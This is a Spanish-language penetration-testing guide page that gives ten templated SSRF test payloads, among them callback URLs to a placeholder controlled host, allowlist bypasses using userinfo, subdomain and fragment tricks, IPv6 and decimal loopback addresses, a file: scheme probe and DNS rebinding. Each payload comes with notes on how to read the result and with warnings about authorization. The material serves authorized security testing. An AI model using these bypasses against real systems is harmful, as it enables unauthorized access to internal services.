# 🗡️ Server-Side Request Forgery (SSRF): payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Callback HTTP controlado

**Objetivo:** Determinar si la solicitud nace del servidor, con URL única.

```json
{"url":"https://{CONTROLLED_HOST}/ssrf-{NONCE}"}
```

**Interpretación:** Registrar hora, IP y ruta; un prefetch del navegador o un escáner de enlaces no confirma SSRF del backend.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/ssrf).

### 2. Callback DNS controlado

**Objetivo:** Detectar una primitive ciega cuando no retorna cuerpo HTTP.

```json
{"url":"http://{NONCE}.{CONTROLLED_HOST}/"}
```

**Interpretación:** Una consulta DNS correlacionada indica resolución; no demuestra que el servidor completó una conexión HTTP.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/ssrf/blind).

### 3. Redirección entre dos hosts propios

**Objetivo:** Comprobar validación del destino final en un endpoint de redirección controlado.

```text
https://{HOST_PROPIO_A}/redirigir?to=https%3A%2F%2F{HOST_PROPIO_B}%2Fssrf-{NONCE}
```

**Interpretación:** Ambos hosts deben ser propios. Si el segundo recibe la llamada, el cliente sigue redirecciones; falta probar un destino prohibido en laboratorio.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 4. Confusión por userinfo

**Objetivo:** Comparar host validado y host realmente contactado en laboratorio.

```text
https://{HOST_PERMITIDO}@{CONTROLLED_HOST}/ssrf-{NONCE}
```

**Interpretación:** En una URL estándar el host de conexión va después de `@`. Solo es bypass si el validador se fija en el prefijo y el cliente contacta el host propio.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 5. Subdominio aparente

**Objetivo:** Comprobar allowlist por prefijo/sufijo mal anclada.

```text
https://{HOST_PERMITIDO}.{CONTROLLED_HOST}/ssrf-{NONCE}
```

**Interpretación:** El dominio registrable es el controlado; registrar la aceptación por la aplicación y la callback.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 6. Fragmento y query

**Objetivo:** Detectar comprobaciones de cadenas que interpretan host dentro de query o fragmento.

```text
https://{CONTROLLED_HOST}/ssrf-{NONCE}#{HOST_PERMITIDO}
https://{CONTROLLED_HOST}/ssrf-{NONCE}?next={HOST_PERMITIDO}
```

**Interpretación:** Un parser correcto sigue conectando a `{CONTROLLED_HOST}`; solo hay fallo si la validación permite la URL por el texto añadido.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 7. IPv6 loopback en laboratorio

**Objetivo:** Distinguir filtros que solo reconocen la forma IPv4 de localhost.

```text
http://[::1]:{PUERTO_DEL_LAB}/marcador
```

**Interpretación:** Usar un servicio local propio del laboratorio. Un error de conexión no demuestra filtrado ni acceso interno.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 8. IPv4 decimal en laboratorio

**Objetivo:** Comprobar normalización de direcciones antes de aplicar la política.

```text
http://2130706433:{PUERTO_DEL_LAB}/marcador
```

**Interpretación:** `2130706433` puede interpretarse como 127.0.0.1 según la biblioteca. Probar únicamente contra un listener propio.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

### 9. Esquema no HTTP

**Objetivo:** Verificar allowlist explícita de esquemas sin leer archivos.

```text
file:///ruta/inexistente/marcador-{NONCE}
```

**Interpretación:** Un error de lectura puede revelar que se aceptó `file:`; no solicitar archivos reales. Documentar parser y respuesta.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/ssrf).

### 10. DNS rebinding aislado

**Objetivo:** Separar la validación DNS de la conexión final usando dos IP de laboratorio.

```text
{HOST_DNS_PROPIO}: respuesta A=198.51.100.10; segunda respuesta A=198.51.100.11
```

**Interpretación:** Registrar a qué IP conectó el backend. Las dos IP deben estar bajo control del laboratorio.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
